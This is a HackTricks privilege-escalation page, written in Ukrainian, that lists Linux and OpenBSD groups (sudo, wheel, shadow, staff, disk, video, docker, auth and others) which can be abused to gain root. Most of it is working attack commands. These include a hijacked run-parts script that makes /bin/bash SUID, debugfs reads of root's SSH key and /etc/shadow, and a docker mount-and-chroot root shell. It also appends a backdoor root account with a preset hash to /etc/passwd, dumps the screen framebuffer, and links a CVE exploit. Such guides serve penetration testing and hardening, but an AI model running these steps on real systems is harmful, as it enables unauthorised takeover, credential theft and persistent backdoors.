# Цікаві групи - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin групи

### **PE - Method 1**

**Іноді**, **за замовчуванням (або тому, що деякому програмному забезпеченню це потрібно)** у файлі **/etc/sudoers** можна знайти деякі з наступних рядків:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Це означає, що **будь-який користувач, який належить до групи sudo або admin, може виконувати будь-що як sudo**.

Якщо це так, щоб **стати root, ви можете просто виконати**:
```
sudo su
```
### PE - Method 2

Знайдіть усі suid binaries та перевірте, чи є binary **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Якщо ви виявите, що бінарний файл **pkexec is a SUID binary** і ви належите до **sudo** або **admin**, ви, ймовірно, зможете запускати бінарні файли як sudo за допомогою `pkexec`.\
Зазвичай саме ці групи вказані в **polkit policy**. Ця політика по суті визначає, які групи можуть використовувати `pkexec`. Перевірте це за допомогою:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Там ви знайдете, які групи мають дозвіл виконувати **pkexec**, і **за замовчуванням** в деяких linux дистрибутивах з'являються групи **sudo** та **admin**.

Щоб **стати root, ви можете виконати**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Якщо ви спробуєте виконати **pkexec** і отримаєте цю **помилку**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Це не через те, що у вас немає дозволів, а через те, що ви підключені без GUI**. А обхідне рішення для цієї проблеми тут: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Вам потрібно **2 різні ssh сесії**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Група wheel

**Іноді**, **за замовчуванням** у файлі **/etc/sudoers** можна знайти цей рядок:
```
%wheel	ALL=(ALL:ALL) ALL
```
Це означає, що **будь-який користувач, який належить до групи wheel, може виконувати будь-що за допомогою sudo**.

Якщо це так, щоб **стати root, ви можете просто виконати**:
```
sudo su
```
## Група shadow

Користувачі з **групи shadow** можуть **читати** файл **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Отже, прочитайте файл і спробуйте **crack some hashes**.

Quick lock-state nuance when triaging hashes:
- Записи з `!` або `*` зазвичай не дозволяють інтерактивний вхід за паролем.
- `!hash` зазвичай означає, що пароль було встановлено, а потім заблоковано.
- `*` зазвичай означає, що дійсного хешу пароля ніколи не встановлювали.
Це корисно для класифікації облікових записів, навіть якщо прямий вхід заблоковано.

## Група staff

**staff**: Дозволяє користувачам додавати локальні модифікації до системи (`/usr/local`) без потреби в root-привілеях (зауважте, що виконувані файли в `/usr/local/bin` знаходяться в змінній PATH будь-якого користувача, і вони можуть "override" виконувані файли в `/bin` та `/usr/bin` з тією ж назвою). Порівняйте з групою "adm", яка більше стосується моніторингу/безпеки. [\[source\]](https://wiki.debian.org/SystemGroups)

У дистрибутивах Debian змінна `$PATH` показує, що `/usr/local/` матиме найвищий пріоритет при пошуку виконуваних файлів, незалежно від того, чи ви привілейований користувач.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Якщо ми можемо hijack деякі програми в `/usr/local`, ми легко зможемо отримати root.

Hijack програми `run-parts` — спосіб легко отримати root, оскільки багато програм запускають `run-parts` (crontab, при вході по ssh).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
або коли відбувається вхід у нову ssh-сесію.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Група disk

Цей привілей майже **еквівалентний доступу root**, оскільки ви можете отримати доступ до всіх даних всередині машини.

Файли:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Зауважте, що, використовуючи debugfs, ви також можете **записувати файли**. Наприклад, щоб скопіювати `/tmp/asd1.txt` у `/tmp/asd2.txt`, можна виконати:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Однак, якщо ви спробуєте **записати файли, що належать root** (наприклад `/etc/shadow` або `/etc/passwd`), ви отримаєте помилку «**Permission denied**».

## Група video

За допомогою команди `w` ви можете дізнатися, **хто зараз увійшов у систему**, і вона покаже вивід, схожий на наступний:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** означає, що користувач **yossi фізично увійшов** до терміналу на машині.

Група **video group** має доступ до перегляду виводу екрану. Власне, ви можете спостерігати за екранами. Для цього потрібно **захопити поточне зображення на екрані** у вигляді сирих даних та визначити роздільну здатність, яку використовує екран. Дані екрану можна зберегти в `/dev/fb0`, а роздільну здатність цього екрана можна знайти в `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Щоб **відкрити** **raw image**, ви можете використати **GIMP**: виберіть файл **`screen.raw`** і в полі типу файлу оберіть **Raw image data**:

![](<../../../images/image (463).png>)

Потім змініть Width та Height на ті значення, що відповідають екрану, і перевірте різні Image Types (оберіть той, який найкраще відображає екран):

![](<../../../images/image (317).png>)

## Група root

Схоже, що за замовчуванням **члени групи root** можуть мати доступ для **зміни** деяких конфігураційних файлів **service**, деяких файлів **libraries** або **інших цікавих речей**, які можуть бути використані для підвищення привілеїв...

**Перевірте, які файли члени групи root можуть змінити**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Ви можете **підмонтувати root filesystem хост-машини до тому інстансу**, тож коли інстанс запускається, він одразу завантажує `chroot` у цей том. Це фактично дає вам root на машині.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Нарешті, якщо вам не подобається жодна з попередніх пропозицій або вони з якихось причин не працюють (docker api firewall?), ви завжди можете спробувати **run a privileged container and escape from it** як пояснено тут:


{{#ref}}
../container-security/
{{#endref}}

Якщо у вас є права на запис у docker socket, прочитайте [**this post about how to escalate privileges abusing the docker socket**](../index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Група


{{#ref}}
./
{{#endref}}

## Adm Група

Зазвичай **члени** групи **`adm`** мають дозвіл **читати лог-файли**, що розташовані в _/var/log/_.\
Тому, якщо ви скомпрометували користувача в цій групі, вам обов'язково слід **переглянути логи**.

## Backup / Operator / lp / Mail групи

Ці групи часто є **credential-discovery** векторами скоріше ніж прямими шляхами до root:
- **backup**: може містити архіви з configs, keys, DB dumps або tokens.
- **operator**: platform-specific operational access, що може leak sensitive runtime data.
- **lp**: print queues/spools можуть містити вміст документів.
- **mail**: mail spools можуть містити reset links, OTPs та internal credentials.

Розглядайте членство тут як знахідку високої цінності щодо експозиції даних і pivot через password/token reuse.

## Auth група

У OpenBSD група **auth** зазвичай може записувати в папки _**/etc/skey**_ і _**/var/db/yubikey**_, якщо вони використовуються.\
Цими дозволами можуть зловживати за допомогою наступного експлойта, щоб **escalate privileges** до root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
